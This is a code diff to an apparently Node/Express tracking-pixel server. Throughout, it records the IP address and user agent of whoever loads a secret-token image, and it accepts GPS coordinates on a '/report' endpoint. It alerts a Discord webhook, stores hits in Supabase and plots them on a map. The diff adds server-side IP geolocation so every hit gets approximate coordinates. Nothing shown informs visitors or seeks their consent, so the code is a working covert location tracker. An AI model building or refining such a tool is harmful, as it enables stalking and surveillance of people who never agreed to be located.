@@ -22,6 +22,32 @@ const PIXEL = Buffer.from(
   'base64'
 );
 
+// Simple IP geolocation helper (server-side)
+async function lookupIP(ip) {
+  return new Promise((resolve) => {
+    if (!ip || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
+      return resolve(null);
+    }
+    const url = `https://ipapi.co/${ip}/json/`;
+    https.get(url, (res) => {
+      let data = '';
+      res.on('data', chunk => data += chunk);
+      res.on('end', () => {
+        try {
+          const json = JSON.parse(data);
+          if (json.latitude && json.longitude) {
+            resolve({ lat: json.latitude, lon: json.longitude, city: json.city, country: json.country_name });
+          } else {
+            resolve(null);
+          }
+        } catch (e) {
+          resolve(null);
+        }
+      });
+    }).on('error', () => resolve(null));
+  });
+}
+
 function sendDiscordNotification(entry) {
   if (!DISCORD_WEBHOOK) return;
   const content = { content: `📍 **Pixel Hit**\n**Time:** ${entry.ts}\n**IP:** ${entry.ip}` };
@@ -44,19 +70,25 @@ function sendDiscordNotification(entry) {
 app.get('/pixel.gif', async (req, res) => {
   if (req.query.t !== SECRET) return res.status(404).end();
 
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
   const entry = {
     ts: new Date().toISOString(),
-    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress,
+    ip,
     ua: req.headers['user-agent'] || null,
     query: req.query
   };
+
+  // Look up approximate location on the server
+  const geo = await lookupIP(ip);
 
   try {
     const { error } = await supabase.from('hits').insert([{
       ts: entry.ts,
       ip: entry.ip,
       ua: entry.ua,
-      query: entry.query
+      query: entry.query,
+      ip_lat: geo ? geo.lat : null,
+      ip_lon: geo ? geo.lon : null
     }]);
     if (error) console.error('IP insert error:', error.message);
   } catch (err) {
@@ -75,11 +107,12 @@ app.post('/report', async (req, res) => {
   if (secret !== SECRET) return res.status(403).json({ error: 'bad secret' });
 
   const { latitude, longitude, accuracy } = req.body;
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
 
   try {
     const { error } = await supabase.from('hits').insert([{
       ts: new Date().toISOString(),
-      ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress,
+      ip,
       ua: req.headers['user-agent'] || null,
       latitude: latitude || null,
       longitude: longitude || null,
@@ -187,7 +220,6 @@ app.get('/map', (req, res) => {
     const map = L.map('map').setView([20, 0], 2);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
 
-    // Custom icons
     const redIcon = new L.Icon({
       iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-red.png',
       shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/images/marker-shadow.png',
@@ -203,17 +235,6 @@ app.get('/map', (req, res) => {
     const info = document.getElementById('info');
     const tbody = document.getElementById('hits-table');
 
-    async function geolocate(ip) {
-      try {
-        const r = await fetch('https://ipapi.co/' + ip + '/json/');
-        if (r.ok) {
-          const d = await r.json();
-          if (d.latitude && d.longitude) return d;
-        }
-      } catch (e) {}
-      return null;
-    }
-
     async function loadHits() {
       try {
         const res = await fetch('/api/hits');
@@ -225,25 +246,25 @@ app.get('/map', (req, res) => {
         for (const hit of data) {
           const time = new Date(hit.ts).toLocaleString();
           const isGps = hit.latitude != null && hit.longitude != null;
+          const hasIpGeo = hit.ip_lat != null && hit.ip_lon != null;
+
           if (isGps) gpsCount++;
+          if (hasIpGeo && !isGps) ipCount++;
 
           const tr = document.createElement('tr');
           tr.innerHTML = '<td>' + time + '</td><td>' + (isGps ? 'GPS' : 'IP') + '</td><td>' + hit.ip + '</td><td>' +
-            (isGps ? hit.latitude.toFixed(5) + ', ' + hit.longitude.toFixed(5) : (hit.ua || '').substring(0, 50)) + '</td>';
+            (isGps ? hit.latitude.toFixed(5) + ', ' + hit.longitude.toFixed(5) :
+             hasIpGeo ? hit.ip_lat.toFixed(5) + ', ' + hit.ip_lon.toFixed(5) : (hit.ua || '').substring(0, 50)) + '</td>';
           tbody.appendChild(tr);
 
           if (isGps) {
             L.marker([hit.latitude, hit.longitude], { icon: redIcon })
               .addTo(map)
               .bindPopup('<b>GPS</b><br>' + hit.ip + '<br>' + time);
-          } else {
-            const geo = await geolocate(hit.ip);
-            if (geo && geo.latitude && geo.longitude) {
-              ipCount++;
-              L.marker([geo.latitude, geo.longitude], { icon: blueIcon })
-                .addTo(map)
-                .bindPopup('<b>IP estimate</b><br>' + hit.ip + '<br>' + time + '<br>' + (geo.city || '') + ', ' + (geo.country_name || ''));
-            }
+          } else if (hasIpGeo) {
+            L.marker([hit.ip_lat, hit.ip_lon], { icon: blueIcon })
+              .addTo(map)
+              .bindPopup('<b>IP estimate</b><br>' + hit.ip + '<br>' + time);
           }
         }
         info.innerHTML = '<strong>Tracking Pixel Map</strong><br>' +
